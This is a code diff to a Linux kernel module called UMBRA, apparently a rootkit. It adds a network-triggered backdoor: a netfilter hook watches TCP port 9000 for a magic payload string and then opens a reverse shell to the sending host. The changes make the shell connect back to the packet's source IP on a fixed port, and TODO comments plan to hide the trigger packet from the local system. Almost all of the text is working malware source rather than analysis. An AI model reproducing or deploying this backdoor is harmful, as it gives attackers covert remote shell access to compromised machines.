@@ -7,7 +7,7 @@ const char* UMBRA_BACKDOOR_KEY = "UMBRA_PAYLOAD_GET_REVERSE_SHELL";
  * Inspects incoming packets and check correspondence to backdoor packet:
  *      Proto: TCP
  *      Port: 9000
- *      
+ *      Payload: UMBRA_PAYLOAD_GET_REVERSE_SHELL
  */ 
 unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
     //Network headers
@@ -15,12 +15,13 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
     struct tcphdr *tcp_header;      //tcp header
     struct sk_buff *sock_buff = skb;//sock buffer
     char *user_data;       //data header pointer
-    unsigned char *tail;            //data tail pointer
+    //Auxiliar
     int size;                       //payload size
     char* _data;
-
     struct tcphdr _tcphdr;
     struct iphdr _iph;
+    char ip_source[16];
+    //char port[16];
 
     if (!sock_buff){
         return NF_ACCEPT; //socket buffer empty
@@ -35,22 +36,19 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
     //Backdoor trigger: TCP
     if(ip_header->protocol==IPPROTO_TCP){ 
         unsigned int dport;
+        unsigned int sport;
 
         tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
         //tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);
 
+        sport = htons((unsigned short int) tcp_header->source);
         dport = htons((unsigned short int) tcp_header->dest);
         //printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
         if(dport != 9000){
             return NF_ACCEPT; //We ignore those not for port 9000
         }
         printk(KERN_INFO "UMBRA:: Received packet on port 9000\n");
-        
-        /* Calculate pointers for begin and end of TCP packet data */
-        //user_data = (unsigned char*)((unsigned char *)ip_header+ ip_header->ihl*4 + tcp_header->doff*4);
-        tail = skb_tail_pointer(skb);
-
-        
+             
 
         //size = htons(ip_header->tot_len) - ip_header->ihl*4 - tcp_header->doff*4;
         size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
@@ -65,8 +63,8 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             kfree(_data);
             return NF_ACCEPT;
         }
-        //user_data = (unsigned char *)((unsigned char *)tcp_header + (tcp_header->doff * 4));
-        printk(KERN_INFO "IP offest %i\n", ip_header->ihl*4);
+        
+        /*printk(KERN_INFO "IP offest %i\n", ip_header->ihl*4);
         printk(KERN_INFO "tcp offest %i\n", tcp_header->doff*4);
        
         printk(KERN_INFO "Total length %i\n", htons(ip_header->tot_len));
@@ -74,7 +72,7 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
         
 
         printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
-        printk(KERN_DEBUG "%s\n", user_data);
+        printk(KERN_DEBUG "%s\n", user_data);*/
 
         if(strlen(user_data)<32){
             return NF_ACCEPT;
@@ -84,8 +82,15 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
             //Packet had the secret payload.
             printk(KERN_INFO "UMBRA:: Received backdoor packet \n");
             //kfree(_data);
-            start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
-            return NF_DROP;
+            
+            //TODO Use a port specified in malicious packet to spawn shell. Right now always 5888
+            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
+            /*sprintf(port, "%d", sport);*/
+            printk(KERN_INFO "UMBRA:: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);
+
+            start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
+            //TODO: Hide the backdoor packet to the local system
+            return NF_ACCEPT;
         }
 
 
@@ -95,17 +100,6 @@ unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_stat
     return NF_ACCEPT;
 
 }
-
-/**
- * The struct comes from netfilter
- */ 
-/*static struct nf_hook_ops nf_hook_struct = {
-    .hook	  = (nf_hookfn*)net_hook,
-    //.owner	  = THIS_MODULE,
-    .pf		  = PF_BRIDGE,
-    .hooknum  = NF_INET_PRE_ROUTING, //Right after ip_rcv
-    .priority = NF_IP_PRI_FIRST
-};*/
 
 static struct nf_hook_ops nfho;
 
